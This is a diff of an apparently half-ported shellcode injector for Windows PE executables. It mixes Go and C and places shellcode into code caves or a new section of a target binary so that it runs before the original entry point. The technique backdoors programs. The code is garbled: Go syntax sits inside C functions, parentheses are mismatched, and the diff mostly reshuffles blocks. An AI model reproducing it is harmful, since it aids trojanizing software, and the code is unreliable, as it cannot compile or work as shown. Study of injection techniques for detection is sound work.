@@ -1,6 +1,46 @@
 int binject_PE(char *file,char *shellcode,int method)
 {
-	int align(size, align, addr uint32) uint32 {
+	
+  if(method==CODE_CAVE)
+  {
+	  
+	/*
+		// Code Cave Method
+		shellcodeLen := len(shellcodeBytes) + 5 // 5 bytes get added later by AppendSuffixJmp
+		for _, section := range peFile.Sections {
+			flags := section.Characteristics
+			if flags&pe.IMAGE_SCN_MEM_EXECUTE != 0 { // todo: should we do the TLS section or other non-X sections?
+				// this section is executable
+				data, err := section.Data()
+				if err != nil {
+					return nil, err
+				}
+				caves, err := FindCaves(data)
+				if err != nil {
+					return nil, err
+				}
+				for _, cave := range caves {
+					if cave.End <= uint64(section.Size) && cave.End-cave.Start >= uint64(shellcodeLen) {
+						scAddr := section.Offset + uint32(cave.Start)
+						shellcode := api.ApplySuffixJmpIntel64(shellcodeBytes, uint32(scAddr), uint32(entryPoint), binary.LittleEndian)
+						peFile.InsertionAddr = scAddr
+						peFile.InsertionBytes = shellcode
+						return peFile.Bytes()
+					}
+				}
+			}
+		}
+	*/
+   for(i=0;i<sections;i++)
+  {
+       x=find_code_cave(strlen(shellcode,section_start,section_end,file_buffer);
+                        if(x!=0)
+                        break;
+  }
+  } 
+  if(method==NEW_SECTION)
+  {
+  int align(size, align, addr uint32) uint32 {
 	if 0 == (size % align) {
 		return addr + size
 	}
@@ -8,7 +48,7 @@ int binject_PE(char *file,char *shellcode,int method)
 }
  
 uint32_t size;
- lastSection := peFile.Sections[peFile.NumberOfSections-1]
+ lastSection = peFile.Sections[peFile.NumberOfSections-1]
   FILE *f;
   f=fopen(file,"r");
   fseek(f,0,SEEK_END);
@@ -58,7 +98,7 @@ func PeBinject(sourceBytes []byte, shellcodeBytes []byte, config *BinjectConfig)
 
 	switch hdr := (peFile.OptionalHeader).(type) {
 	case *pe.OptionalHeader32:
-		v := newsection.VirtualSize
+		v = newsection.VirtualSize
 		if v == 0 {
 			v = newsection.Size // SizeOfRawData
 		}
@@ -77,7 +117,7 @@ func PeBinject(sourceBytes []byte, shellcodeBytes []byte, config *BinjectConfig)
 		hdr.DataDirectory[4].Size = 0
 		break
 	case *pe.OptionalHeader64:
-		v := newsection.VirtualSize
+		v = newsection.VirtualSize
 		if v == 0 {
 			v = newsection.Size // SizeOfRawData
 		}
@@ -103,46 +143,6 @@ func PeBinject(sourceBytes []byte, shellcodeBytes []byte, config *BinjectConfig)
 	return peFile.Bytes()
 }
 }
-  if(method==CODE_CAVE)
-  {
-	  
-	/*
-		// Code Cave Method
-		shellcodeLen := len(shellcodeBytes) + 5 // 5 bytes get added later by AppendSuffixJmp
-		for _, section := range peFile.Sections {
-			flags := section.Characteristics
-			if flags&pe.IMAGE_SCN_MEM_EXECUTE != 0 { // todo: should we do the TLS section or other non-X sections?
-				// this section is executable
-				data, err := section.Data()
-				if err != nil {
-					return nil, err
-				}
-				caves, err := FindCaves(data)
-				if err != nil {
-					return nil, err
-				}
-				for _, cave := range caves {
-					if cave.End <= uint64(section.Size) && cave.End-cave.Start >= uint64(shellcodeLen) {
-						scAddr := section.Offset + uint32(cave.Start)
-						shellcode := api.ApplySuffixJmpIntel64(shellcodeBytes, uint32(scAddr), uint32(entryPoint), binary.LittleEndian)
-						peFile.InsertionAddr = scAddr
-						peFile.InsertionBytes = shellcode
-						return peFile.Bytes()
-					}
-				}
-			}
-		}
-	*/
-   for(i=0;i<sections;i++)
-  {
-       x=find_code_cave(strlen(shellcode,section_start,section_end,file_buffer);
-                        if(x!=0)
-                        break;
-  }
-  } 
-  if(method==NEW_SECTION)
-  {
-  
     
     
     
